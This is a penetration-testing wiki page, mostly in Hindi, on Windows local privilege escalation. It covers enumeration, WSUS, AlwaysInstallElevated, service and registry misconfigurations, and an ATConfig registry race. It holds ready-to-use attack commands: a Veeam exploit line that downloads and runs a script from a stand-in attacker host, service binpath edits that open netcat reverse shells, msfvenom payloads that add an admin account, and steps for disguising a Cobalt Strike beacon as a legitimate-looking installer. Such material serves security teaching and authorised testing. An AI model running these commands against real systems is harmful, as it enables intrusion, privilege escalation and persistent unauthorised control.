# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors ढूँढने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**अगर आपको नहीं पता कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्न पेज पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न पेज देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**अगर आपको नहीं पता कि Windows में integrity levels क्या हैं, तो आगे बढ़ने से पहले निम्न पेज पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में अलग-अलग चीज़ें हैं जो **system को enumerate करने से रोक** सकती हैं, executables चला सकती हैं या यहाँ तक कि **आपकी activities को detect** कर सकती हैं। privilege escalation enumeration शुरू करने से पहले आपको **यह निम्न **page** पढ़ना चाहिए** और इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के माध्यम से लॉन्च किए गए UIAccess processes का दुरुपयोग करके बिना prompts के High IL तक पहुँचा जा सकता है, जब AppInfo secure-path checks bypass किए जाते हैं। समर्पित UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

हाल के Windows builds ने एक **SMB arbitrary-port** LPE path भी introduced किया है, जहाँ एक privileged local NTLM authentication को reused SMB TCP connection के over reflected किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में detailed information खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो Windows environment द्वारा प्रस्तुत **massive attack surface** को दिखाता है।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credential/Juicy info सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

आप इसे कैसे चालू करना है, यह [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) में सीख सकते हैं
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline executions के विवरण रिकॉर्ड किए जाते हैं, जिनमें executed commands, command invocations, और scripts के parts शामिल होते हैं। हालांकि, complete execution details और output results शायद capture न हों।

इसे enable करने के लिए, documentation के "Transcript files" section में दिए गए instructions का पालन करें, और **"Powershell Transcription"** की बजाय **"Module Logging"** चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 events देखने के लिए आप execute कर सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के execution की complete activity और full content record कैप्चर की जाती है, जिससे यह सुनिश्चित होता है कि code का हर block उसके run होते ही documented हो। यह process हर activity का एक comprehensive audit trail preserve करती है, जो forensics और malicious behavior का analysis करने के लिए valuable है। execution के समय सभी activity को document करके, process में detailed insights प्रदान की जाती हैं।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए logging events Windows Event Viewer में इस path पर located हो सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
अंतिम 20 events देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** के बजाय http का उपयोग करके request नहीं किए जाते हैं, तो आप सिस्टम को compromise कर सकते हैं।

आप cmd में निम्नलिखित चलाकर शुरू करते हैं कि क्या network non-SSL WSUS update का उपयोग करता है:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी जैसा कोई जवाब मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` है।

तो, **यह exploitable है।** यदि आख़िरी registry का मान 0 है, तो WSUS entry ignore कर दी जाएगी।

इन vulnerabilities को exploit करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools का उपयोग कर सकते हैं - ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS traffic में 'fake' updates inject करते हैं।

Research यहाँ पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरा report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
मूल रूप से, यही वह flaw है जिसे यह bug exploit करता है:

> यदि हमारे पास local user proxy को modify करने की power है, और Windows Updates Internet Explorer की settings में configured proxy का उपयोग करता है, तो हमारे पास [PyWSUS](https://github.com/GoSecure/pywsus) को locally run करके अपने ही traffic को intercept करने और अपने asset पर elevated user के रूप में code चलाने की power होती है।
>
> इसके अलावा, since WSUS service current user की settings का उपयोग करती है, वह अपना certificate store भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate generate करें और इस certificate को current user के certificate store में add करें, तो हम HTTP और HTTPS दोनों WSUS traffic को intercept कर पाएँगे। WSUS certificate पर trust-on-first-use type validation implement करने के लिए HSTS-like mechanisms का उपयोग नहीं करता। यदि प्रस्तुत certificate user द्वारा trusted है और सही hostname रखता है, तो service उसे accept कर लेगी।

आप इस vulnerability को [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool का उपयोग करके exploit कर सकते हैं (एक बार यह liberated हो जाए)।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents localhost IPC surface और privileged update channel expose करते हैं। यदि enrollment को attacker server की ओर coerce किया जा सके और updater किसी rogue root CA या weak signer checks पर trust करता हो, तो local user एक malicious MSI deliver कर सकता है जिसे SYSTEM service install करती है। एक generalized technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` **TCP/9401** पर एक localhost service expose करता है जो attacker-controlled messages process करती है, जिससे arbitrary commands **NT AUTHORITY\SYSTEM** के रूप में चलाए जा सकते हैं।

- **Recon**: listener और version की पुष्टि करें, जैसे `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` जैसे PoC को आवश्यक Veeam DLLs के साथ उसी directory में रखें, फिर local socket के माध्यम से SYSTEM payload trigger करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

एक **local privilege escalation** vulnerability Windows **domain** environments में specific conditions के तहत मौजूद है। इन conditions में ऐसे environments शामिल हैं जहाँ **LDAP signing is not enforced,** users के पास **Resource-Based Constrained Delegation (RBCD)** को configure करने के लिए self-rights होते हैं, और domain के भीतर users के लिए computers create करने की capability होती है। यह ध्यान देना महत्वपूर्ण है कि ये **requirements** **default settings** के साथ पूरी होती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

हमले के flow के बारे में अधिक जानकारी के लिए [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** ये 2 registers **enabled** हैं (value **0x1** है), तो किसी भी privilege के users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में install (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

प्रिविलेज बढ़ाने के लिए वर्तमान डायरेक्टरी के अंदर Windows MSI binary बनाने हेतु power-up से `Write-UserAddMSI` कमांड का उपयोग करें। यह script एक precompiled MSI installer लिखती है जो user/group addition के लिए prompt करती है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए binary को execute करें ताकि privileges escalate हो जाएँ।

### MSI Wrapper

इस tool का उपयोग करके MSI wrapper कैसे बनाना है, यह सीखने के लिए यह tutorial पढ़ें। ध्यान दें कि अगर आप सिर्फ command lines execute करना चाहते हैं, तो आप "**.bat**" file को wrap कर सकते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike या Metasploit से `C:\privesc\beacon.exe` में एक **new Windows EXE TCP payload** **Generate** करें
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को **AlwaysPrivesc** जैसा नाम दें, location के लिए **`C:\privesc`** इस्तेमाल करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) तक न पहुँच जाएँ। **Add** पर क्लिक करें और अभी-अभी generate किया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** project को highlight करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- और भी properties हैं जिन्हें आप बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक legitimate लग सकती है।
- project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि installer चलते ही beacon payload execute हो जाए।
- **Custom Action Properties** के तहत **Run64Bit** को **True** में बदलें।
- आखिर में, **build it**।
- अगर warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखे, तो सुनिश्चित करें कि आपने platform को x64 पर set किया है।

### MSI Installation

malicious `.msi` file की **installation** को background में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability का exploit करने के लिए आप इस्तेमाल कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

ये settings तय करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** को **local Administrator passwords के management** के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि domain से जुड़े computers पर हर password **unique, randomised, और regularly updated** हो। ये passwords securely **Active Directory** के भीतर stored रहते हैं और केवल वही users access कर सकते हैं जिन्हें ACLs के माध्यम से sufficient permissions दी गई हैं, जिससे वे authorized होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि active हो, तो **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में stored होते हैं।\
[**इस page पर WDigest के बारे में अधिक info**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अविश्वसनीय प्रक्रियाओं द्वारा इसकी memory पढ़ने या code inject करने के प्रयासों को **block** किया जा सके, जिससे system और अधिक secure हो गया।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### क्रेडेंशियल्स गार्ड

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसी threats से सुरक्षित रखना है।| [**Credentials Guard के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा authenticated किया जाता है और operating system components द्वारा उपयोग किया जाता है। जब किसी user का logon data किसी registered security package द्वारा authenticated होता है, तो उस user के लिए domain credentials आमतौर पर established हो जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Users & Groups की Enumeration

आपको जांचना चाहिए कि जिन groups में आप belong करते हैं, उनमें से किसी के पास interesting permissions हैं या नहीं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

यदि आप **कुछ privileged group के सदस्य हैं तो आप privileges escalate करने में सक्षम हो सकते हैं**। privileged groups के बारे में और privileges escalate करने के लिए उनका abuse कैसे करें, यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और जानें** कि **token** क्या है इस पेज में: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**interesting tokens** के बारे में जानने और उनका abuse कैसे करें, इसके लिए निम्न पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Password Policy
```bash
net accounts
```
### Clipboard की content प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

सबसे पहले, processes को list करते समय **process की command line के अंदर passwords check करें**.\
जांचें कि क्या आप **चल रहे किसी binary को overwrite** कर सकते हैं या binary folder पर आपकी write permissions हैं, ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) exploit किए जा सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) की जाँच करें।

**प्रोसेस binaries की permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेसेज़ बाइनरीज़ के फ़ोल्डर्स की permissions जाँचना (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप **procdump** from sysinternals का उपयोग करके किसी running process का memory dump बना सकते हैं। FTP जैसी services में **credentials in clear text in memory** होते हैं, memory dump करने की कोशिश करें और credentials पढ़ें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM के रूप में चलने वाले Applications किसी user को CMD spawn करने, या directories browse करने की अनुमति दे सकते हैं।**

Example: "Windows Help and Support" (Windows + F1), "command prompt" search करें, "Click to open Command Prompt" पर click करें

## Services

Service Triggers Windows को कुछ निश्चित conditions होने पर service start करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर उनके triggers fire करके privileged services start कर सकते हैं। Enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services की list प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
प्रत्येक service के लिए आवश्यक privilege level की जांच करने के लिए _Sysinternals_ का binary **accesschk** होना recommended है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसा की जाती है कि जांचें कि क्या "Authenticated Users" किसी service को modify कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप accesschk.exe for XP को यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह error आ रहा है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे सक्षम कर सकते हैं using
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि service upnphost को काम करने के लिए SSDPSRV पर निर्भर होना पड़ता है (XP SP1 के लिए)**

**इस समस्या का एक और workaround** है:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी path modify करें**

उस scenario में जहाँ "Authenticated users" group के पास किसी service पर **SERVICE_ALL_ACCESS** होता है, service के executable binary को modify करना संभव है। **sc** को modify और execute करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सर्विस को रीस्टार्ट करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
विशेषाधिकार विभिन्न permissions के माध्यम से escalate किए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership acquisition और permission reconfiguration की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता inherit करता है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी inherit करता है।

इस vulnerability के detection और exploitation के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries weak permissions

अगर कोई service **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, या किसी privileged domain account** के रूप में चलती है, लेकिन **low-privileged users service EXE या उसके parent folder को modify कर सकते हैं**, तो service को अक्सर **binary को replace करके और service को restart करके** hijack किया जा सकता है।

**जांचें कि क्या आप उस binary को modify कर सकते हैं जो service द्वारा execute की जाती है** या क्या आपके पास उस folder पर **write permissions** हैं जहाँ binary located है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप **wmic** (system32 में नहीं) का उपयोग करके service द्वारा execute की जाने वाली हर binary प्राप्त कर सकते हैं और **icacls** का उपयोग करके अपनी permissions check कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** भी इस्तेमाल कर सकते हैं:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Look for dangerous ACLs granted to **`Everyone`**, **`BUILTIN\Users`**, or **`Authenticated Users`**, especially **`(F)`**, **`(M)`**, or **`(W)`** on the service executable or on the directory containing it. एक व्यावहारिक abuse flow यह है:

1. `sc qc <service_name>` के साथ service account और executable path की पुष्टि करें।
2. `icacls <path>` के साथ पुष्टि करें कि binary writable है।
3. सेवा binary को payload या एक valid malicious service binary से replace करें।
4. `sc stop <service_name> && sc start <service_name>` के साथ सेवा restart करें (या reboot / service trigger का इंतजार करें)।

Useful automated checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> यदि सेवा किसी सामान्य उपयोगकर्ता को इसे restart करने की अनुमति नहीं देती, तो जाँचें कि क्या यह boot पर automatically start होती है, क्या इसमें कोई failure action है जो इसे relaunch करती है, या क्या इसे उसे उपयोग करने वाला application indirectly trigger कर सकता है।

### Services registry modify permissions

आपको जाँच करनी चाहिए कि क्या आप किसी service registry को modify कर सकते हैं।\
आप किसी service **registry** पर अपने **permissions** की **check** इस तरह कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जाँचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। यदि हाँ, तो service द्वारा executed binary को बदला जा सकता है।

Executed binary के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

कुछ Windows Accessibility features per-user **ATConfig** keys बनाती हैं, जिन्हें बाद में एक **SYSTEM** process द्वारा HKLM session key में copy किया जाता है। एक registry **symbolic link race** इस privileged write को **किसी भी HKLM path** पर redirect कर सकती है, जिससे arbitrary HKLM **value write** primitive मिलता है।

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` installed accessibility features को सूचीबद्ध करता है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` user-controlled configuration store करता है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान create होता है और user द्वारा writable होता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. उस **HKCU ATConfig** value को populate करें जिसे आप SYSTEM द्वारा write कराना चाहते हैं।
2. secure-desktop copy trigger करें (e.g., **LockWorkstation**), जो AT broker flow शुरू करता है।
3. **Race जीतें** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; जब oplock fire हो, तो **HKLM Session ATConfig** key को एक **registry link** से protected HKLM target पर replace करें।
